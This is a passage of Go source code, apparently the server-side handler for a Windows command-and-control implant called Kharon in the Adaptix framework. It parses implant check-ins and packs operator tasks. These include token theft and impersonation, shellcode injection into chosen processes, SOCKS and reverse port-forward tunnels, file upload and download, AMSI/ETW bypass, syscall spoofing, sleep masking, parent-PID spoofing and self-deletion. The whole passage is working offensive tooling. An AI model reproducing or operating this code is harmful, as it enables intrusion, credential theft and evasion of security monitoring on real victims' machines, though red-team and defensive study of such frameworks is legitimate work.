	usedRAM := packer.ParseInt32()
	fmt.Printf("Used RAM: %v\n", usedRAM)

	percentRAM := packer.ParseInt32()
	fmt.Printf("Percent RAM: %v\n", percentRAM)

	numProcessors := packer.ParseInt32()
	fmt.Printf("Processors Nbr: %v\n", numProcessors)

	key := packer.ParseBytes()
	fmt.Printf("Session Key: %v\n", key)

	username := ConvertCpToUTF8(string(usernameBytes), acp)
	computer := ConvertCpToUTF8(string(computerBytes), acp)
	process := ConvertCpToUTF8(string(imagePathBytes), acp)
	if strings.Contains(process, "\\") {
		parts := strings.Split(process, "\\")
		process = parts[len(parts)-1]
	}

	elevated := elevatedValue > 0
	arch := "x64"
	if procArch != 0x64 {
		arch = "x86"
	}

	osDesc := "Windows (x64)"
	if osArch != 0x64 {
		osDesc = "Windows (x86)"
	}

	agent = adaptix.AgentData{
		Id:         agentId,
		SessionKey: key,
		OemCP:      oemcp,
		ACP:        acp,
		Sleep:      sleep / 1000,
		Jitter:     jitter,
		Username:   username,
		Computer:   computer,
		Process:    process,
		Pid:        fmt.Sprintf("%v", pid),
		Tid:        fmt.Sprintf("%v", tid),
		Arch:       arch,
		Elevated:   elevated,
		Os:         OS_WINDOWS,
		OsDesc:     osDesc,
	}

	fmt.Printf("Final Agent Struct: %+v\n", agent)

	return agent, nil
}

func AgentEncryptData(data []byte, key []byte) ([]byte, error) {
	return data, nil
}

func AgentDecryptData(data []byte, key []byte) ([]byte, error) {
	return data, nil
}

/// TASKS

func PackTasks(agentData adaptix.AgentData, tasksArray []adaptix.TaskData) ([]byte, error) {
	var packData []byte

	/// START CODE HERE

	var (
		array []interface{}
		err   error
	)

	array = append(array, int8(0))
	array = append(array, len(tasksArray))

	for _, taskData := range tasksArray {
		randomId := make([]byte, 19)
		_, _ = rand.Read(randomId)
		taskUID := taskData.TaskId + hex.EncodeToString(randomId)

		array = append(array, taskUID)
		array = append(array, len(taskData.Data))
		array = append(array, taskData.Data)
	}

	packData, err = PackArray(array)
	if err != nil {
		return nil, err
	}

	/// END CODE

	return packData, nil
}

func PackPivotTasks(pivotId string, data []byte) ([]byte, error) {

	/// START CODE

	/// END CODE

	return data, nil
}

func CreateTask(ts Teamserver, agent adaptix.AgentData, args map[string]any) (adaptix.TaskData, adaptix.ConsoleMessageData, error) {
	var (
		taskData    adaptix.TaskData
		messageData adaptix.ConsoleMessageData
		err         error
	)

	command, ok := args["command"].(string)
	if !ok {
		return taskData, messageData, errors.New("'command' must be set")
	}
	subcommand, _ := args["subcommand"].(string)

	taskData = adaptix.TaskData{
		Type: TYPE_TASK,
		Sync: true,
	}

	messageData = adaptix.ConsoleMessageData{
		Status: MESSAGE_INFO,
		Text:   "",
	}
	messageData.Message, _ = args["message"].(string)

	/// START CODE HERE

	var array []interface{}

	switch command {

	case "ps":

		switch subcommand {

		case "list":
			array = []interface{}{TASK_PROC, PROC_LIST}

		case "run":
			programArgs, ok := args["cmd"].(string)
			if !ok {
				err = errors.New("parameter 'cmd' must be set")
				goto RET
			}
			array = []interface{}{TASK_PROC, PROC_RUN, ConvertUTF8toCp(programArgs, agent.ACP)}

		case "kill":
			pid, ok := args["pid"].(float64)
			if !ok {
				err = errors.New("parameter 'pid' must be set")
				goto RET
			}
			array = []interface{}{TASK_PROC, PROC_KILL, int(pid)}

		default:
			err = errors.New("subcommand for 'ps': 'list', 'run', 'kill'")
			goto RET
		}

	case "fs":

		switch subcommand {

		case "cat":
			path, ok := args["path"].(string)
			if !ok {
				err = errors.New("parameter 'path' must be set")
				goto RET
			}
			array = []interface{}{TASK_FS, FS_CAT, ConvertUTF8toCp(path, agent.ACP)}

		case "cd":
			path, ok := args["path"].(string)
			if !ok {
				err = errors.New("parameter 'path' must be set")
				goto RET
			}
			array = []interface{}{TASK_FS, FS_CD, ConvertUTF8toCp(path, agent.ACP)}

		case "cp":
			src, ok := args["src"].(string)
			if !ok {
				err = errors.New("parameter 'src' must be set")
				goto RET
			}
			dst, ok := args["dst"].(string)
			if !ok {
				err = errors.New("parameter 'dst' must be set")
				goto RET
			}
			array = []interface{}{TASK_FS, FS_COPY, ConvertUTF8toCp(src, agent.ACP), ConvertUTF8toCp(dst, agent.ACP)}

		case "ls":
			dir, ok := args["directory"].(string)
			if !ok {
				err = errors.New("parameter 'directory' must be set")
				goto RET
			}
			if strings.HasSuffix(dir, "\\") {
				dir += "*"
			} else {
				dir += "\\*"
			}

			array = []interface{}{TASK_FS, FS_LS, ConvertUTF8toCp(dir, agent.ACP)}

		case "mv":
			src, ok := args["src"].(string)
			if !ok {
				err = errors.New("parameter 'src' must be set")
				goto RET
			}
			dst, ok := args["dst"].(string)
			if !ok {
				err = errors.New("parameter 'dst' must be set")
				goto RET
			}
			array = []interface{}{TASK_FS, FS_MOVE, ConvertUTF8toCp(src, agent.ACP), ConvertUTF8toCp(dst, agent.ACP)}

		case "mkdir":
			path, ok := args["path"].(string)
			if !ok {
				err = errors.New("parameter 'path' must be set")
				goto RET
			}
			array = []interface{}{TASK_FS, FS_MKDIR, ConvertUTF8toCp(path, agent.ACP)}

		case "pwd":
			array = []interface{}{TASK_FS, FS_PWD}

		case "rm":
			path, ok := args["path"].(string)
			if !ok {
				err = errors.New("parameter 'path' must be set")
				goto RET
			}
			array = []interface{}{TASK_FS, FS_RM, ConvertUTF8toCp(path, agent.ACP)}

		default:
			err = errors.New("subcommand for 'fs': 'cat', 'cd', 'cp', 'ls', 'mv', 'mkdir', 'pwd', 'ls' ")
			goto RET
		}

	case "exit":

		if subcommand == "thread" {
			array = []interface{}{TASK_EXIT, EXIT_THREAD}
		} else if subcommand == "process" {
			array = []interface{}{TASK_EXIT, EXIT_PROCESS}
		} else {
			err = errors.New("subcommand must be 'thread' or 'process'")
			goto RET
		}
		break

	case "info":
		array = []interface{}{TASK_GETINFO}

	case "socks":
		taskData.Type = TYPE_TUNNEL

		fmt.Printf("Breakpoint 1\n")

		portNumber, ok := args["port"].(float64)
		port := int(portNumber)
		if ok {
			if port < 1 || port > 65535 {
				err = errors.New("port must be from 1 to 65535")
				goto RET
			}
		}
		if subcommand == "start" {
			address, ok := args["address"].(string)
			if !ok {
				err = errors.New("parameter 'address' must be set")
				goto RET
			}
			fmt.Printf("Breakpoint 2: In Start\n")

			auth, _ := args["-a"].(bool)
			if auth {
				username, ok := args["username"].(string)
				if !ok {
					err = errors.New("parameter 'username' must be set")
					goto RET
				}
				password, ok := args["password"].(string)
				if !ok {
					err = errors.New("parameter 'password' must be set")
					goto RET
				}

				tunnelId, err := ts.TsTunnelCreateSocks5(agent.Id, "", address, port, true, username, password)
				if err != nil {
					goto RET
				}
				fmt.Printf("Breakpoint 3 - FInished TsTunnelCreateSocks5\n")

				taskData.TaskId, err = ts.TsTunnelStart(tunnelId)
				if err != nil {
					goto RET
				}
				fmt.Printf("Breakpoint 3 - FInished TsTunnelCreateSocks5\n")

				taskData.Message = fmt.Sprintf("Socks5 (with Auth) server running on port %d", port)

			} else {
				tunnelId, err := ts.TsTunnelCreateSocks5(agent.Id, "", address, port, false, "", "")
				if err != nil {
					goto RET
				}
				taskData.TaskId, err = ts.TsTunnelStart(tunnelId)
				if err != nil {
					goto RET
				}

				taskData.Message = fmt.Sprintf("Socks5 server running on port %d", port)
			}
			taskData.MessageType = MESSAGE_SUCCESS
			taskData.ClearText = "\n"

		} else if subcommand == "stop" {
			taskData.Completed = true

			ts.TsTunnelStopSocks(agent.Id, port)

			taskData.MessageType = MESSAGE_SUCCESS
			taskData.Message = "Socks5 server has been stopped"
			taskData.ClearText = "\n"

		} else {
			err = errors.New("subcommand must be 'start' or 'stop'")
			goto RET
		}

	case "rportfwd":
		taskData.Type = TYPE_TUNNEL

		lportNumber, ok := args["lport"].(float64)
		lport := int(lportNumber)
		if ok {
			if lport < 1 || lport > 65535 {
				err = errors.New("port must be from 1 to 65535")
				goto RET
			}
		}

		if subcommand == "start" {
			fhost, ok := args["fwdhost"].(string)
			if !ok {
				err = errors.New("parameter 'fwdhost' must be set")
				goto RET
			}
			fportNumber, ok := args["fwdport"].(float64)
			fport := int(fportNumber)
			if ok {
				if fport < 1 || fport > 65535 {
					err = errors.New("port must be from 1 to 65535")
					goto RET
				}
			}

			tunnelId, err := ts.TsTunnelCreateRportfwd(agent.Id, "", lport, fhost, fport)
			if err != nil {
				goto RET
			}
			taskData.TaskId, err = ts.TsTunnelStart(tunnelId)
			if err != nil {
				goto RET
			}

			messageData.Message = fmt.Sprintf("Starting reverse port forwarding %d to %s:%d", lport, fhost, fport)
			messageData.Status = MESSAGE_INFO

		} else if subcommand == "stop" {
			taskData.Completed = true

			ts.TsTunnelStopRportfwd(agent.Id, lport)

			taskData.MessageType = MESSAGE_SUCCESS
			taskData.Message = "Reverse port forwarding has been stopped"

		} else {
			err = errors.New("subcommand must be 'start' or 'stop'")
			goto RET
		}

	case "upload":

		remote_path, ok := args["remote_path"].(string)
		if !ok {
			err = errors.New("parameter 'remote_path' must be set")
			goto RET
		}

		localFile, ok := args["local_file"].(string)
		if !ok {
			err = errors.New("parameter 'local_file' must be set")
			goto RET
		}

		fileContent, err := base64.StdEncoding.DecodeString(localFile)
		if err != nil {
			goto RET
		}

		chunkSize := 0x500000 // 5Mb
		bufferSize := len(fileContent)

		inTaskData := adaptix.TaskData{
			Type:    TYPE_TASK,
			AgentId: agent.Id,
			Sync:    false,
		}

		fileID := generateRandomString(10)
		inCmd := []interface{}{TASK_UPLOAD, int(0), ConvertUTF8toCp(fileID, agent.ACP), ConvertUTF8toCp(remote_path, agent.ACP)}
		inTaskData.Data, _ = PackArray(inCmd)
		inTaskData.TaskId = fmt.Sprintf("%08x", mrand.Uint32())

		ts.TsTaskCreate(agent.Id, "", "", inTaskData)

		numChunks := (bufferSize + chunkSize - 1) / chunkSize
		i := 1

		for start := 0; start < bufferSize; start += chunkSize {
			fin := start + chunkSize
			finish := false
			if fin >= bufferSize {
				fin = bufferSize
				finish = true
			}

			lenBytes := make([]byte, 4)
			binary.LittleEndian.PutUint32(lenBytes, uint32(fin-start))

			// Concatenate length + data
			result := append(lenBytes, fileContent[start:fin]...)
			inCmd := []interface{}{TASK_UPLOAD, int(1), ConvertUTF8toCp(fileID, agent.ACP), int(numChunks), int(i), len(fileContent[start:fin]), result}

			if finish {
				array = inCmd
				break

			} else {
				inTaskData.Data, _ = PackArray(inCmd)
				inTaskData.TaskId = fmt.Sprintf("%08x", mrand.Uint32())

				ts.TsTaskCreate(agent.Id, "", "", inTaskData)
			}
			i = i + 1
		}

	case "download":
		remote_path, ok := args["remote_path"].(string)
		if !ok {
			err = errors.New("parameter 'remote_path' must be set")
			goto RET
		}
		fileID := generateRandomString(10)
		fmt.Printf("FileID: %s\n", fileID)
		fmt.Printf("remote_Path: %s\n", remote_path)
		array = []interface{}{TASK_DOWNLOAD, ConvertUTF8toCp(fileID, agent.ACP), ConvertUTF8toCp(remote_path, agent.ACP)}

	case "token":
		switch subcommand {

		case "getuid":
			array = []interface{}{TASK_TOKEN, TOKEN_GET_UUID}

		case "steal":
			pid, ok := args["pid"].(float64)
			if !ok {
				err = errors.New("parameter 'pid' must be set")
				goto RET
			}
			isuse, _ := args["impersonate"].(bool)
			use := int(0)
			if isuse {
				use = 1
			}
			array = []interface{}{TASK_TOKEN, TOKEN_STEAL, int(pid), use}

		case "impersonate":
			id, ok := getIntFromArgs(args["token_id"])
			fmt.Printf("token id: %d\n", id)
			if !ok {
				err = errors.New("parameter 'id' must be set")
				goto RET
			}
			array = []interface{}{TASK_TOKEN, TOKEN_USE, int(id)}

		case "list":
			array = []interface{}{TASK_TOKEN, TOKEN_LIST}

		case "rm":
			id, ok := getIntFromArgs(args["token_id"])
			if !ok {
				err = errors.New("parameter 'id' must be set")
				goto RET
			}
			array = []interface{}{TASK_TOKEN, TOKEN_RM, int(id)}

		case "revert":
			array = []interface{}{TASK_TOKEN, TOKEN_REVERT}

		case "make":
			username, ok := args["username"].(string)
			if !ok {
				err = errors.New("parameter 'username' must be set")
				goto RET
			}
			domain, ok := args["domain"].(string)

			password, ok := args["password"].(string)
			if !ok {
				err = errors.New("parameter 'password' must be set")
				goto RET
			}
			array = []interface{}{TASK_TOKEN, TOKEN_MAKE, ConvertUTF8toCp(username, agent.ACP), ConvertUTF8toCp(password, agent.ACP), ConvertUTF8toCp(domain, agent.ACP)}

		case "privget":
			array = []interface{}{TASK_TOKEN, TOKEN_PRIV_GET}

		case "privlist":
			array = []interface{}{TASK_TOKEN, TOKEN_PRIV_LIST}

		default:
			err = errors.New("subcommand for 'token': 'getuid', 'steal', 'use', 'rm', 'revert', 'make', 'privget', 'privlist'")
			goto RET
		}

	case "config":
		switch subcommand {

		case "sleep":
			var sleepTime int
			sleep, sleepOk := args["val"].(string)
			if !sleepOk {
				err = errors.New("parameter 'val' must be set")
				goto RET
			}

			sleepInt, err := strconv.Atoi(sleep)
			if err == nil {
				sleepTime = sleepInt
			} else {
				t, err := time.ParseDuration(sleep)
				if err == nil {
					sleepTime = int(t.Seconds())
				} else {
					err = errors.New("sleep must be in '%h%m%s' format or number of seconds")
					goto RET
				}
			}
			messageData.Message = fmt.Sprintf("Task: sleep to %v", sleep)

			array = []interface{}{TASK_CONFIG, 1, CONFIG_SLEEP, sleepTime}

			agent.Sleep = uint(sleepTime)
			_ = ts.TsAgentUpdateData(agent)

		case "jitter":
			jitter, jitterOk := args["val"].(float64)
			if !jitterOk {
				err = errors.New("parameter 'val' must be set")
				goto RET
			}

			jitterTime := int(jitter)
			if jitterTime < 0 || jitterTime > 100 {
				err = errors.New("jitterTime must be from 0 to 100")
				goto RET
			}
			messageData.Message = fmt.Sprintf("Task: sleep with %v%% jitter", jitterTime)

			array = []interface{}{TASK_CONFIG, 1, CONFIG_JITTER, jitterTime}

			agent.Jitter = uint(jitterTime)
			_ = ts.TsAgentUpdateData(agent)

		case "ppid":
			pid, ok := args["pid"].(float64)
			if !ok {
				err = errors.New("parameter 'pid' must be set")
				goto RET
			}
			array = []interface{}{TASK_CONFIG, 1, CONFIG_PPID, int(pid)}

		case "killdate.date":
			dt, ok := args["date"].(string)
			if !ok {
				err = errors.New("parameter 'date' must be set")
				goto RET
			}

			parsedDate, err := time.Parse("02.01.2006", dt)
			if err != nil {
				goto RET
			}
			array = []interface{}{TASK_CONFIG, 1, CONFIG_KD_DATE, int(parsedDate.Year()), int(parsedDate.Month()), int(parsedDate.Day())}

		case "killdate.selfdel":
			status, ok := args["status"].(string)
			if !ok {
				err = errors.New("parameter 'status' must be set")
				goto RET
			}

			enabled := 0
			if status == "true" {
				enabled = 1
			} else if status == "false" {
				enabled = 0
			} else {
				err = errors.New("Unknonw status type. Type must be 'true' or 'false'")
				goto RET
			}

			array = []interface{}{TASK_CONFIG, 1, CONFIG_KD_SELFDEL, int(enabled)}
		case "killdate.exit":
			method, ok := args["method"].(string)
			if !ok {
				err = errors.New("parameter 'method' must be set")
				goto RET
			}

			enabled := 0
			if method == "process" {
				enabled = 1
			} else if method == "thread" {
				enabled = 0
			} else {
				err = errors.New("Unknonw method type. Type must be 'process' or 'thread'")
				goto RET
			}

			array = []interface{}{TASK_CONFIG, 1, CONFIG_KD_EXIT, int(enabled)}
		case "mask.beacon":
			tp, ok := args["type"].(string)
			if !ok {
				err = errors.New("parameter 'type' must be set")
				goto RET
			}

			num := 0
			if tp == "timer" {
				num = 1
			} else if tp == "none" {
				num = 3
			} else {
				err = errors.New("Unknonw mask type. Type must be 'none' or 'timer'")
				goto RET
			}
			array = []interface{}{TASK_CONFIG, 1, CONFIG_MASK, int(num)}

		case "mask.heap":
			status, ok := args["status"].(string)
			if !ok {
				err = errors.New("parameter 'status' must be set")
				goto RET
			}

			enabled := 0
			if status == "true" {
				enabled = 1
			} else if status == "false" {
				enabled = 0
			} else {
				err = errors.New("Unknonw status type. Type must be 'true' or 'false'")
				goto RET
			}

			array = []interface{}{TASK_CONFIG, 1, CONFIG_MASK_HEAP, int(enabled)}
		case "spawnto":
			spawnto, ok := args["spawnto"].(string)
			if !ok {
				err = errors.New("parameter 'spawnto' must be set")
				goto RET
			}

			array = []interface{}{TASK_CONFIG, 1, CONFIG_SPAWN, spawnto}
		case "blockdlls":
			status, ok := args["status"].(string)
			if !ok {
				err = errors.New("parameter 'status' must be set")
				goto RET
			}

			enabled := 0
			if status == "true" {
				enabled = 1
			} else if status == "false" {
				enabled = 0
			} else {
				err = errors.New("Unknonw status type. Type must be 'true' or 'false'")
				goto RET
			}
			array = []interface{}{TASK_CONFIG, 1, CONFIG_BLOCK_DLLS, int(enabled)}

		case "amsi_etw_bypass":
			{
				bypass, ok := args["bypass"].(string)
				if !ok {
					err = errors.New("parameter 'bypass' must be set")
					goto RET
				}

				bypass_n := 0
				if bypass == "amsi" {
					bypass_n = 0x700
				} else if bypass == "etw" {
					bypass_n = 0x400
				} else if bypass == "all" {
					bypass_n = 0x100
				} else if bypass == "none" {
					bypass_n = 0x000
				} else {
					err = errors.New("Unknonw bypass type. Type must be 'amsi', 'etw', 'all' or 'none'")
					goto RET
				}

				array = []interface{}{TASK_CONFIG, 1, CONFIG_AE_BYPASS, int(bypass_n)}
			}

		case "inject.alloc":
			{
				alloc, ok := args["alloc"].(string)
				if !ok {
					err = errors.New("parameter 'alloc' must be set")
					goto RET
				}

				alloc_n := 0
				if alloc == "drip" {
					alloc_n = 1
				} else if alloc == "standard" {
					alloc_n = 0
				} else {
					err = errors.New("Unknonw alloc type. Type must be 'drip' or 'standard'")
					goto RET
				}

				array = []interface{}{TASK_CONFIG, 1, CONFIG_INJ_ALLOC, int(alloc_n)}
			}
		case "inject.write":
			{
				write, ok := args["write"].(string)
				if !ok {
					err = errors.New("parameter 'write' must be set")
					goto RET
				}

				write_n := 0
				if write == "apc" {
					write_n = 1
				} else if write == "standard" {
					write_n = 0
				} else {
					err = errors.New("Unknonw write type. Type must be 'apc' or 'standard")
					goto RET
				}

				array = []interface{}{TASK_CONFIG, 1, CONFIG_INJ_WRITE, int(write_n)}
			}
		
		case "syscall": 
			syscall, ok := args["syscall"].(string)
			if !ok {
				err = errors.New("parameter 'syscall' must be set")
				goto RET
			}

			syscall_n := 0

			if syscall == "spoof" {
				syscall_n = 1
			} else if syscall == "spoof_indirect" {
				syscall_n = 2
			} else if syscall == "none" {
				syscall_n = 0
			} else {
				err = errors.New("Unknown syscall method. Syscall must be 'spoof', 'spoof_indirect' or 'none'")
			}

			array = []interface{}{TASK_CONFIG, 1, CONFIG_SYSCALL, int(syscall_n)}
		case "pipe_name_fork": {
			forkPipeName := args["name"].(string)
			if !ok {
				err = errors.New("parameter 'name' must be set")
				goto RET
			}

			array = []interface{}{TASK_CONFIG, 1, CONFIG_FORKPIPE, forkPipeName}
		}
		default:
			err = errors.New("subcommand for 'config': 'sleep', 'jitter', 'killdate', 'mask', 'blockdlls'")
			goto RET
		}

	case "scinject":
		shellcode, ok := args["shellcode"].(string)
		if !ok {
			err = errors.New("parameter 'shellcode' must be set")
			goto RET
		}
		pid, ok := args["pid"].(float64)
		if !ok {
			err = errors.New("parameter 'pid' must be set")
			goto RET
		}
		shellcodeContent, err := base64.StdEncoding.DecodeString(shellcode)
		if err != nil {
			goto RET
		}

		array = []interface{}{TASK_SCINJECT, len(shellcodeContent), shellcodeContent, int(pid)}

	case "selfdel":
		array = []interface{}{TASK_SELFDEL}
	case "execute":
		switch subcommand {
		case "bof":
			taskData.Type = TYPE_JOB

			wd, err := os.Getwd()
			if err != nil {
				panic(err)
			}

			postex_path := filepath.Join(filepath.Dir(wd), "dist", "extenders", "agent_kharon", "src_modules")

			bofFile, ok := args["bof_file"].(string)
			if !ok {
				err = errors.New("parameter 'bof' must be set")
				goto RET
			}

			fmt.Printf("bof file path: %s\n", bofFile)

			if strings.Contains(bofFile, "kharon_replace_folder") {
				bofFile = strings.ReplaceAll(bofFile, "kharon_replace_folder", postex_path)
			}

			bofContent, err := base64.StdEncoding.DecodeString(bofFile)
			if err != nil {
				goto RET
			}

			var params []byte
			paramData, ok := args["param_data"].(string)
			if ok {
				params, err = base64.StdEncoding.DecodeString(paramData)
				if err != nil {
					params = []byte(paramData)
				}
			}

			cmdId := int(rand.Int31())

			array = []interface{}{TASK_EXEC_BOF, len(bofContent), bofContent, cmdId, len(params), params}
		case "postex":
			taskData.Type = TYPE_JOB

			method, ok := args["method"].(string)
			if !ok {
				err = errors.New("parameter 'method' must be set")
				goto RET
			}

			fork_type_n := 0

			if method != "inline" && method != "fork" {
				err = errors.New("parameter 'method' must be 'inline' or 'fork'")
				goto RET
			}

			method_n := 0x15

			if method == "inline" {
				method_n = 0x15
			} else if method == "fork" {
				method_n = 0x20

				fork_type, ok_1 := args["fork_type"].(string)
				if !ok_1 {
					err = errors.New("parameter 'fork_type' must be set")
					goto RET
				}

				if fork_type == "explicit" {
					fork_type_n = 0x100
				} else if fork_type == "spawn" {
					fork_type_n = 0x200
				}
			}

		scFile, ok := args["sc_file"].(string)
		if !ok {
			err = errors.New("parameter 'sc_file' must be set")
			goto RET
		}

		explicitPid := 0
		if pidVal, ok := args["pid"]; ok {
			if pidInt, ok := pidVal.(int); ok {
				explicitPid = pidInt
			} else {
				if pidFloat, ok := pidVal.(float64); ok {
					explicitPid = int(pidFloat)
				}
			}
		} else {
			fmt.Printf("[DEBUG] pid arg does NOT exist in args map\n")
		}

		scContent, err := base64.StdEncoding.DecodeString(scFile)
		if err != nil {
			goto RET
		}

		var params []byte
		paramData, ok := args["param_data"].(string)
		if ok {
			params, err = base64.StdEncoding.DecodeString(paramData)
			if err != nil {
				params = []byte(paramData)
			}
		}

			array = []interface{}{TASK_POSTEX, int(method_n), int(fork_type_n), int(explicitPid), len(scContent), scContent, len(params), params}
		default:
			err = errors.New("subcommand for 'execute': 'bof', 'postex'")
			goto RET
		}
	default:
		err = errors.New(fmt.Sprintf("Command '%v' not found", command))
		goto RET
	}

	taskData.Data, err = PackArray(array)
	if err != nil {
		goto RET
	}

	/// END CODE

RET:
	return taskData, messageData, err
}

func ProcessTasksResult(ts Teamserver, agentData adaptix.AgentData, taskData adaptix.TaskData, packedData []byte) []adaptix.TaskData {
	var outTasks []adaptix.TaskData

	/// START CODE

	packer := CreatePacker(packedData)

	// Print packedData
	// fmt.Printf("=== PACKED DATA DEBUG ===\n")
	// fmt.Printf("Total bytes: %d\n", len(packedData))
	// fmt.Printf("Hex dump:\n%s", hex.Dump(packedData))
	// fmt.Printf("Raw hex: %x\n", packedData)
	// fmt.Printf("========================\n\n")

	if false == packer.CheckPacker([]string{"int"}) {
		return outTasks
	}

	taskCount := packer.ParseInt32()

	for taskIndex := uint(0); taskIndex < taskCount && packer.CheckPacker([]string{"int"}); taskIndex++ {
		dataType := packer.ParseInt32()

		if dataType == 0x5 || dataType == 0x7 { // QuickMsg || QuickOut
			if len(packer.buffer) < 16 {
				return outTasks
			}

			TaskUID := string(packer.ParsePad(36))
			if len(TaskUID) < 8 {
				return outTasks
			}
			task := taskData
			task.TaskId = TaskUID[:8]

			if dataType == 0x7 && packer.CheckPacker([]string{"int"}) {
				packer.ParseInt32() // cmdID
			}

			if false == packer.CheckPacker([]string{"int", "array"}) {
				return outTasks
			}

			outputType := packer.ParseInt32()

			if outputType == CALLBACK_ERROR {
				output := packer.ParseString()

				task.MessageType = MESSAGE_ERROR
				// task.Message = "BOF output"
				task.ClearText = ConvertCpToUTF8(output, agentData.ACP)

			} else if outputType == CALLBACK_SCREENSHOT {
				task.MessageType = MESSAGE_SUCCESS
				screenBuff := packer.ParseBytes()
				ts.TsScreenshotAdd(agentData.Id, "", screenBuff)
			} else if outputType == CALLBACK_OUTPUT_OEM {
				output := packer.ParseString()

				task.MessageType = MESSAGE_SUCCESS
				// task.Message = "BOF output"
				task.ClearText = ConvertCpToUTF8(output, agentData.OemCP)

			} else if outputType == CALLBACK_NO_PRE_MSG {
				output := packer.ParseString()

				task.ClearText = ConvertCpToUTF8(output, agentData.ACP)
			} else {
				output := packer.ParseString()

				task.MessageType = MESSAGE_SUCCESS
				// task.Message = "BOF output"
				task.ClearText = ConvertCpToUTF8(output, agentData.ACP)
			}

			task.Completed = false
			outTasks = append(outTasks, task)

		} else if dataType == 0x25 || dataType == 0x15 { // web || smb

			if false == packer.CheckPacker([]string{"array"}) {
				return outTasks
			}

			cmd_packer := CreatePacker(packer.ParseBytes())
			if cmd_packer.CheckPacker([]string{"array", "word"}) {

				TaskUID := cmd_packer.ParseString()
				if len(TaskUID) < 8 {
					continue
				}
				task := taskData
				task.TaskId = TaskUID[:8]

				commandId := int16(cmd_packer.ParseInt16())
				switch commandId {

				case TASK_PROC:
					if cmd_packer.CheckPacker([]string{"byte"}) {
						subCommandId := int8(cmd_packer.ParseInt8())
						switch subCommandId {

						case PROC_RUN:
							if cmd_packer.CheckPacker([]string{"int", "int"}) {

								pid := cmd_packer.ParseInt32()
								tid := cmd_packer.ParseInt32()

								task.Message = fmt.Sprintf("Process with PID %v (TID %v) started", pid, tid)

								if cmd_packer.CheckPacker([]string{"array"}) {
									task.ClearText = ConvertCpToUTF8(string(cmd_packer.ParseString()), agentData.OemCP)
								}
							}
							break

						case PROC_LIST:

							type ps_data struct {
								fullpath  string
								imagename string
								cmdline   string
								pid       uint
								ppid      uint
								handles   uint
								sessid    uint
								threads   uint
								user      string
								arch      string
							}
							var ps_data_list []ps_data

							for cmd_packer.CheckPacker([]string{"array", "array", "array", "int", "int", "int", "int", "int", "array", "int"}) {
								ps_item := ps_data{
									fullpath:  ConvertCpToUTF8(cmd_packer.ParseString(), agentData.ACP),
									imagename: ConvertCpToUTF8(cmd_packer.ParseString(), agentData.ACP),
									cmdline:   ConvertCpToUTF8(cmd_packer.ParseString(), agentData.ACP),
									pid:       cmd_packer.ParseInt32(),
									ppid:      cmd_packer.ParseInt32(),
									handles:   cmd_packer.ParseInt32(),
									sessid:    cmd_packer.ParseInt32(),
									threads:   cmd_packer.ParseInt32(),
									user:      ConvertCpToUTF8(cmd_packer.ParseString(), agentData.ACP),
								}
								is64 := cmd_packer.ParseInt32()
								if is64 == 0 {
									ps_item.arch = "x64"
								} else {
									ps_item.arch = "x86"
								}

								ps_data_list = append(ps_data_list, ps_item)
							}

							var proclist []adaptix.ListingProcessDataWin

							if len(ps_data_list) == 0 {
								errorCode := packer.ParseInt32()
								task.Message = fmt.Sprintf("Error [%d]: %s", errorCode, win32ErrorCodes[errorCode])
								task.MessageType = MESSAGE_ERROR

							} else {
								contextMaxSize := 10
								processMaxSize := 20

								for _, item := range ps_data_list {
									procData := adaptix.ListingProcessDataWin{
										Pid:         item.pid,
										Ppid:        item.ppid,
										SessionId:   item.sessid,
										ProcessName: item.imagename,
										Arch:        item.arch,
									}

									if item.user != "-" {
										procData.Context = item.user

										if len(procData.Context) > contextMaxSize {
											contextMaxSize = len(procData.Context)
										}
									}

									if len(procData.ProcessName) > processMaxSize {
										processMaxSize = len(procData.ProcessName)
									}

									proclist = append(proclist, procData)
								}

								type TreeProc struct {
									Data     ps_data
									Children []*TreeProc
								}

								procMap := make(map[uint]*TreeProc)
								var roots []*TreeProc

								for _, proc := range ps_data_list {
									node := &TreeProc{Data: proc}
									procMap[proc.pid] = node
								}

								for _, node := range procMap {
									if node.Data.ppid == 0 || node.Data.pid == node.Data.ppid {
										roots = append(roots, node)
									} else if parent, ok := procMap[node.Data.ppid]; ok {
										parent.Children = append(parent.Children, node)
									} else {
										roots = append(roots, node) // orphaned node
									}
								}

								sort.Slice(roots, func(i, j int) bool {
									return roots[i].Data.pid < roots[j].Data.pid
								})

								maxTreeDepth := 0

								var sortChildren func(node *TreeProc, depth int) int
								sortChildren = func(node *TreeProc, depth int) int {
									if depth > maxTreeDepth {
										maxTreeDepth = depth
									}

									sort.Slice(node.Children, func(i, j int) bool {
										return node.Children[i].Data.pid < node.Children[j].Data.pid
									})

									for _, child := range node.Children {
										sortChildren(child, depth+1)
									}
									return maxTreeDepth
								}
								for _, root := range roots {
									sortChildren(root, 1) // стартовая глубина = 1
								}

								format := fmt.Sprintf(" %%-5v   %%-5v   %%-7v   %%-7v   %%-7v   %%-5v   %%-%vv   %%v", contextMaxSize)
								OutputText := fmt.Sprintf(format, "PID", "PPID", "Handles", "Threads", "Session", "Arch", "Context", "Process")
								OutputText += fmt.Sprintf("\n"+format, "---", "----", "-------", "-------", "-------", "----", "-------", "-------")

								var lines []string

								var formatTree func(node *TreeProc, prefix string, isLast bool)
								formatTree = func(node *TreeProc, prefix string, isLast bool) {
									branch := "├─ "
									if isLast {
										branch = "└─ "
									}
									treePrefix := prefix + branch
									data := node.Data

									line := fmt.Sprintf(format, data.pid, data.ppid, data.handles, data.threads, data.sessid, data.arch, data.user, treePrefix+data.imagename)
									lines = append(lines, line)

									childPrefix := prefix
									if isLast {
										childPrefix += "    "
									} else {
										childPrefix += "│   "
									}

									for i, child := range node.Children {
										formatTree(child, childPrefix, i == len(node.Children)-1)
									}
								}

								for i, root := range roots {
									formatTree(root, "", i == len(roots)-1)
								}

								OutputText += "\n" + strings.Join(lines, "\n")
								task.Message = "Process list:"
								task.ClearText = OutputText
							}

							SyncBrowserProcess(ts, task, proclist)

						case PROC_KILL:

							if cmd_packer.CheckPacker([]string{"int"}) {
								status := packer.ParseInt32()
								if status != 0 {
									task.Message = fmt.Sprintf("Process killed")
								} else {
									task.MessageType = MESSAGE_ERROR
									task.Message = fmt.Sprintf("Process not killed")
								}
							}

						default:
							continue
						}
					}
					break

				case TASK_FS:
					if cmd_packer.CheckPacker([]string{"byte"}) {

						subCommandId := int8(cmd_packer.ParseInt8())
						switch subCommandId {

						case FS_LS:

							//				if false == packer.CheckPacker([]string{"int"}) {
							//					return outTasks
							//				}
							//				errorCode := packer.ParseInt32()
